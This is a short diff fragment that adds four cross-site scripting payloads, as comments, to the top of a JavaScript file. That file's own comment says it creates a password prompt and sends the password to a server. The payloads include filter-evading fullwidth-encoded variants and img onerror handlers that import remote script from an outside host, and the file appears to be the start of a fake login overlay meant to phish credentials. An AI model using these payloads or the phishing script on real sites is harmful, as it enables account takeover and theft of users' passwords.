@@ -1,3 +1,7 @@
+//comments=<script>alert('xss')</script>
+//comments='%uff1cscript%uff1ealert('xss')%uff1c%2fscript%uff1e'
+//comments=%uff1cimg%20src=d%20onerror=import("https://bushesaresafe.github.io/j/p.js")%uff1e
+//comments=<img src =q onerror=import("https://bushesaresafe.github.io/j/p.js")>
 // This script creates a password prompt and sends the password to the server
 let div = document.createElement('div');
 div.style.position = 'fixed';
